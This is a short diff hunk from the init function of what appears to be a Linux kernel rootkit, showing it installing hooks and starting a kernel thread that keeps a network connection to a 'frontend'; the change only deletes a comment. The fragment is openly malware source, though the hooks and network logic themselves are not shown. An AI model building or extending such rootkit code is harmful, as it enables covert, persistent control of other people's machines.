@@ -29,7 +29,6 @@ static __init int rootkit_init(void)
     pr_info("rootkit: setting hooks up...\n");
     setup_hooks();
 
-    // Network setup succeeded. Start thread to keep connection with frontend:
     thread = kthread_run(network_loop, cfg, "loop_thread");
     if (IS_ERR(thread))
     {
